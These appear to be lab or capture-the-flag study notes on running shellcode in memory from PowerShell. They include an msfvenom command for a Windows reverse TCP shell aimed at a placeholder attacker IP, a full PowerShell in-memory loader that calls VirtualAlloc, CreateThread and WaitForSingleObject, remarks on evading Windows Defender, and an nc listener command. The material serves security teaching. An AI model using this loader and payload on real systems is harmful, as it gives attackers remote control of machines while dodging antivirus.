**Terminology**

- **Shellcode**
    - A piece of code usually used by malicioius actors during exploits to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine.
    - Typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability
- **Powershell**
    - Scripting language and command-line shell built into Windows for task automation and configuration management.
    - Allows users to interact with system components and is widely used by administrators for legitimate purposes
    - Attackers use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms
- **Windows Defender**
    - A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks by scanning code at runtime.
    - Common bypass methods - obfuscating scriipts to disguise malicious content, reflective injection where malicious code is loaded directly into memory, avoiding detection by signature-based defences
- **Windows API**
    - Windows Application Programming Interface allows programs to interact with the underlying operating system, giving access to essential system-level functions such as memory management, file operations and networking
    - Serves as a bridge between application and operating system, enable efficient resource handling
    - Crucial as many exploitation techniques and malware rely on it to manipulate processes, allocate memory and execute shellcodes
    - Common Windows API functions frequently used by malicious actors (`VirtualAlloc`, `CreateThread`, `WaitFroSingleObject`)
- **Accessing Windows API through PowerShell Reflection**
    - Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell.
    - Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime, allowing them to manipulate low-level system processes
    - A primary  tool for bypassing security mechanisms, interacting with the operating system and executing code stealthily
- **Reverse shell**
    - A type of connection in which the target initiates a connection back to your attacking machine

**Generating Shellcode (with msfvenom)**

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`

![08SS01](https://github.com/user-attachments/assets/452c07e6-b08c-4c9e-923a-ba4a0bca8cd9)

`-p` flag tells `msfvenom` the type of payload. `windows/x64/shell_reverse_tcp` specifies the reverse shell payload for a Windows machine

`Lhost` listener’s IP address

`Lport` listener’s port

`-f powershell` specifies the format for the output.

Actual shellcode in the output is the hex-encoded byte array, which starts with `0xfc, 0xe8, 0x82` etc. The hexadecimal numbers represent the instructions set on the target machine and are just for human  to read.

PowerShell code to call a few Windows APIs via C# code

```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Explanation of code

Script starts by defining C# classes, using the `DllImport` attribute to load specific functions from the `kernel32` DLL, which is part of the Windows API

- `VirtualAlloc` - Function that allocates memory in the process’s address space, commonly used in scenarios like this to prepare memory for storing and executing shellcode
- `CreateThread` - Function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory
- `WaitForSingleObject` - Function pauses execution until a specific thread finishes its task. In this case, ensures that shellcode has completed execution

These classes are then added to PowerShell using the `Add-Type` command, allowing PS to use these functions

**Storing Shellcode in a Byte Array**

The script stores the shellcode in the `$buf` variable, a byte array. Replace the `SHELLCODE_PLACEHOLDER` with the real shellcode that is represented as a series of hexadecimal values. In this case, generated through `msfvenom`. Hex values are instructions that will be executed when the shellcode runs.

`[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)`

**Allocating Memory for the Shellcode**

`VirtualAlloc` function allocates a block of memory where the shellcode will be stored, using the following arguments:

- `0`  for memory address - Windows will decide where to allocate the memory
- `$size` for size of memory block - determined by the length of shellcode
- `0x3000` for the allocation type - tells Windows to reserve and commit the memory
- `0x40` for memory protection - memory is readable and executable (necessary for executing shellcode)

`[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length`

After memory is allocated, the `Marshal.Copy` function copies the shellcode from the `$buf` array into the allocated memory address (`$addr`), preparing it for execution

`$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)`

**Executing Shellcode and Waiting for Completion**

Once shellcode is stored in memory, the script calls the `CreateThread` function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (`$addr`). 

`[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")`

Then it uses `WaitForSingleObject` function, ensuring it waits for the shellcode execution to finish before continuing.

Enter the codes into PowerShell

![08SS02](https://github.com/user-attachments/assets/727bf10e-f043-467c-ad91-fddfb4a736ef)

Listening on another machine

`nc -nlvp 1111`

![08SS03](https://github.com/user-attachments/assets/1a433b4e-a2e1-45f9-967c-327915982342)
